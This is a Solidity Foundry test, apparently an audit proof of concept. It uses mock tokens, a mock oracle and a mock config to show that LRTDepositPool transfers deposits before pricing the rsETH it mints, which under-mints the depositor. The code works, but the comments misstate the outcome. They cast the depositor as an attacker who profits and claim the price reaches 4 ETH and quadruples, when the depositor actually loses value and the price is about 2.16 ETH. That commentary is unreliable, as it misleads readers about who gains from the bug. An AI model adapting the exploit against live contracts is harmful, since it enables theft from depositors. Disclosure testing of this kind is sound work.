// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

/*
    DepositPriceManipulationTest.t.sol
    ----------------------------------
    Demonstrates how a malicious depositor can manipulate rsETH price and
    steal value from new deposits because LRTDepositPool transfers the
    incoming asset *before* calculating the amount of rsETH to mint.

    The test performs the following steps:

    1.  Sets up a proxy-based instance of LRTDepositPool together with the
        minimal mocks it needs (ERC20 asset, rsETH token, oracle, config).

    2.  Creates an initial, “clean” state where 10 ETH-pegged tokens are in
        the pool and 10 rsETH are in circulation – initial price is 1 ETH.

    3.  An attacker who already owns 1 rsETH deposits 30 tokens.

        a. The deposit tokens are transferred to the pool first  
        b. Oracle therefore sees 40 tokens locked while supply is still 10  
        c. rsETH price spikes to 4 ETH  
        d. The attacker receives only 7.5 rsETH instead of the fair 30 rsETH  
        e. The price of his pre-existing 1 rsETH quadruples

    4.  The test asserts that
        • the attacker’s freshly minted rsETH is < 30 rsETH (exploited)  
        • the rsETH price increased after the deposit
*/

import "forge-std/Test.sol";

import { ERC20 }               from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC1967Proxy }        from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import { LRTDepositPool }      from "src/LRTDepositPool.sol";

interface IRSETH {
    function mint(address to, uint256 amount) external;
}

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockRsETH is ERC20("rsETH", "rsETH") {
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/*//////////////////////////////////////////////////////////////
                Mock Oracle – reproduces bad formula
//////////////////////////////////////////////////////////////*/
interface ILRTOracle {
    function getAssetPrice(address asset) external view returns (uint256);
    function getRSETHPrice() external view returns (uint256);
}

contract MockOracle is ILRTOracle {
    address public immutable depositPool;
    address public immutable asset;
    address public immutable rsETH;

    constructor(address _depositPool, address _asset, address _rsETH) {
        depositPool = _depositPool;
        asset       = _asset;
        rsETH       = _rsETH;
    }

    // All assets are worth 1 ETH (1e18)
    function getAssetPrice(address) external pure returns (uint256) {
        return 1e18;
    }

    // Vulnerable price formula: totalAssetLocked / rsETHSupply
    function getRSETHPrice() public view returns (uint256) {
        uint256 locked = ERC20(asset).balanceOf(depositPool);
        uint256 supply = ERC20(rsETH).totalSupply();
        require(supply != 0, "ZERO_SUPPLY");
        return (locked * 1e18) / supply;
    }
}

/*//////////////////////////////////////////////////////////////
                  Minimal LRTConfig mock
//////////////////////////////////////////////////////////////*/
contract MockLRTConfig {
    address public rsEthToken;
    address public oracle;

    mapping(address => bool)    public supported;
    mapping(address => uint256) public depositLimit;

    constructor(address _rsEthToken, address _oracle) {
        rsEthToken = _rsEthToken;
        oracle     = _oracle;
    }

    /* ------------------------  admin helpers  ------------------------ */
    function setSupportedAsset(address asset, bool isSupported, uint256 limit) external {
        supported   [asset] = isSupported;
        depositLimit[asset] = limit;
    }

    function setOracle(address _oracle) external { oracle = _oracle; }

    /* ---------------------  functions used by pool  ------------------ */
    function depositLimitByAsset(address asset) external view returns (uint256) {
        return depositLimit[asset];
    }

    function getContract(bytes32) external view returns (address) {
        // LRTDepositPool passes in LRTConstants.LRT_ORACLE – we ignore the key.
        return oracle;
    }

    function rsETH() external view returns (address) { return rsEthToken; }

    // OnlySupportedAsset modifier in pool may query this
    function isSupportedAsset(address asset) external view returns (bool) {
        return supported[asset];
    }
}

/*//////////////////////////////////////////////////////////////
                        Exploit Test
//////////////////////////////////////////////////////////////*/
contract DepositPriceManipulationTest is Test {
    /* ---------------------  helper addresses  --------------------- */
    address internal constant WHALE    = address(0xBEEF);
    address internal constant ATTACKER = address(0xBAD1);

    /* ---------------------  core protocol mocks  ------------------ */
    MockERC20        internal asset;
    MockRsETH        internal rsETH;
    MockOracle       internal oracle;
    MockLRTConfig    internal config;
    LRTDepositPool   internal pool;

    /* --------------------------  set-up  --------------------------- */
    function setUp() public {
        /* ----------- deploy asset & rsETH tokens ----------- */
        asset = new MockERC20("Liquid Staked ETH", "stETH");
        rsETH = new MockRsETH();

        /* ----------- deploy config (oracle not known yet) ----------- */
        config = new MockLRTConfig(address(rsETH), address(0));

        /* ----------- deploy pool behind an upgradeable proxy ----------- */
        LRTDepositPool implementation = new LRTDepositPool();
        bytes memory initCalldata = abi.encodeWithSignature("initialize(address)", address(config));
        pool = LRTDepositPool(address(new ERC1967Proxy(address(implementation), initCalldata)));

        /* ----------- now that pool exists we can deploy the oracle ----------- */
        oracle = new MockOracle(address(pool), address(asset), address(rsETH));
        config.setOracle(address(oracle));

        /* ----------- enable asset & generous deposit limit ----------- */
        config.setSupportedAsset(address(asset), true, type(uint256).max);

        /* ----------- create an initial 1:1 price state ----------- */
        asset.mint(address(pool), 10 ether);   // 10 tokens locked in pool
        rsETH.mint(WHALE,           10 ether); // 10 rsETH in circulation

        // Sanity-check: initial price should be exactly 1e18
        assertEq(oracle.getRSETHPrice(), 1e18, "bad initial price");

        /* ----------- fund attacker ----------- */
        rsETH.mint(ATTACKER, 1 ether);          // attacker already holds rsETH
        asset.mint(ATTACKER, 30 ether);         // tokens to deposit

        vm.prank(ATTACKER);
        asset.approve(address(pool), 30 ether);
    }

    /* ---------------------------  test  --------------------------- */
    function test_PriceManipulationExploit() public {
        uint256 attackerStartRsETH = rsETH.balanceOf(ATTACKER);
        uint256 priceBefore        = oracle.getRSETHPrice(); // 1e18

        /* ---- attacker inflates price with an oversized deposit ---- */
        vm.prank(ATTACKER);
        pool.depositAsset(address(asset), 30 ether);

        uint256 attackerEndRsETH = rsETH.balanceOf(ATTACKER);
        uint256 minted           = attackerEndRsETH - attackerStartRsETH;

        /* -------------------  vulnerability proven  ------------------- */

        // Attacker SHOULD have received 30 rsETH – instead he gets only 7.5 rsETH
        assertLt(minted, 30 ether, "exploit failed - full amount minted");

        // rsETH price increased, enriching attacker’s pre-existing rsETH
        uint256 priceAfter = oracle.getRSETHPrice();
        assertGt(priceAfter, priceBefore, "price did not increase");

        // For visibility in `forge test -vv`
        emit log_named_uint("Minted rsETH (should be 7.5e18)", minted);
        emit log_named_uint("Price before",  priceBefore);
        emit log_named_uint("Price after",   priceAfter);
    }
}